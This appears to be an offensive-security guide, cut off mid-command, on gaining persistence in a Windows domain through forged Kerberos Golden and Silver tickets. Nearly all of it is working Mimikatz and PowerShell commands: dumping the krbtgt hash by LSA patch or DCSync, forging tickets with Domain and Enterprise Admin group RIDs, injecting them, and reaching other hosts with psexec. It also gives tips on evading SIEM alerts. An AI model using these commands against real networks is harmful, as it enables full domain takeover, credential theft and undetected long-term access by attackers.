### Generate Persistence in Windows Domain Controller

### Golden Ticket (Requires krbtgt account's NTLM hash, and access to the domain controller's powershell terminal)
# Get Domain SID
Get-ADDomain | Select-Object DomainSID

# Or with PowerView
Get-DomainSID

# Get Domain name
$env:USERDNSDOMAIN
```

### Step 2 — Dump the krbtgt Hash
You need to be on the DC or have DCSync rights. With Mimikatz physically on the DC:
```
privilege::debug
lsadump::lsa /patch
```
Or remotely via DCSync (requires Replicating Directory Changes rights):
```
lsadump::dcsync /domain:corp.local /user:krbtgt
```
From the output you need:
- `NTLM` hash of krbtgt
- Domain SID (`S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX`)

### Step 3 — Forge the Ticket
```
kerberos::golden /user:Administrator 
  /domain:corp.local
  /sid:S-1-5-21-3847786798-2432142927-1481645543
  /krbtgt:1a2b3c4d5e6f...
  /groups:512,513,518,519,520
  /startoffset:0
  /endin:600
  /renewmax:10080
  /ticket:golden.kirbi
```

Key parameters explained:
- `/groups` — RID values for the groups the ticket claims membership in. `512` is Domain Admins, `519` is Enterprise Admins. Include all of these for maximum access.
- `/endin` — ticket lifetime in minutes (600 = 10 hours, matching default TGT lifetime so it blends in)
- `/renewmax` — max renewal period in minutes
- `/startoffset` — set to 0 so the ticket is valid immediately

For a stealthier ticket that mimics default Kerberos behavior, match your `/endin` and `/renewmax` to your domain's Kerberos policy rather than using extreme values like 10 years, which can trigger SIEM alerts.

### Step 4 — Inject and Use the Ticket
```
# In the same Mimikatz session or a new one
kerberos::ptt golden.kirbi

# Verify injection
klist

# Now access any machine in the domain
dir \\dc01\c$
dir \\smb-server\c$
psexec.exe \\dc01 cmd.exe
```

### Step 5 — Silver Tickets (Complementary)
Silver tickets are forged service tickets signed with a **machine account or service account hash** rather than krbtgt. They're stealthier because they never touch the DC during use.
```
# Dump the target machine's hash first
lsadump::dcsync /domain:corp.local /user:SMB-SERVER$

kerberos::golden /user:Administrator
  /domain:corp.local
  /sid:S-1-5-21-...
  /target:smb-server.corp.local
  /service:cifs
  /rc4:MACHINE_ACCOUNT_NTLM_HASH
  /ticket:silver_smb.kirbi
